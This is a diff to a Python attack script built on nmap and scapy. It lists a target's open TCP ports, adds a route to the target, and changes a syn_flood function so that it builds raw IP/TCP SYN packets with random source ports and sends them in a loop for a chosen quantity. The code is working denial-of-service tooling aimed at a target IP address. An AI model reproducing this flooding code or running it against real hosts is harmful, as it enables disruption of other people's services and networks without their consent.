@@ -48,14 +48,15 @@ values["target_mac_address"]=target_mac_address
 
 # For troubleshooting in case get target ports errors out
 print("Ports open")
-for port in nm[target_ip].all_udp():
-	state = nm[target_ip]['udp'][port]['state']
+for port in nm[target_ip].all_tcp():
+	state = nm[target_ip]['tcp'][port]['state']
 	if state == 'open':
-		print(nm[target_ip]['udp'][port])
+		print(nm[target_ip]['tcp'][port])
 
 # Get Target Ports
 tcp_ports = list(nm[target_ip]['tcp'].keys())
 values["tcp_ports"]=tcp_ports
+conf.route.add(host=target_ip)
 
 # To test comment out everything above (including the import block) and uncomment the block below
 '''
@@ -89,7 +90,8 @@ def syn_flood():
     variable_input(valid_var, help_statement)
     all_variables_inputted(valid_var)
     check_var(values, valid_var)
-    template = (Ether(src=values.get("source_mac_address"), dst=values.get("target_mac_address"))/IP(dst=values.get("target_ip"), ttl=99)/TCP(sport=RandShort(), seq=12345, ack=1000, flags="S"))
+    template = (IP(dst=values.get("target_ip"), ttl=99)/TCP(sport=RandShort(), seq=12345, ack=1000, flags="S"))
+    #template = (Ether(src=values.get("source_mac_address"), dst=values.get("target_mac_address"))/IP(dst=values.get("target_ip"), ttl=99)/TCP(sport=RandShort(), seq=12345, ack=1000, flags="S"))
     ns = []
     pktAmt = int(values.get("quantity"))
     for pktNum in range(0,pktAmt):
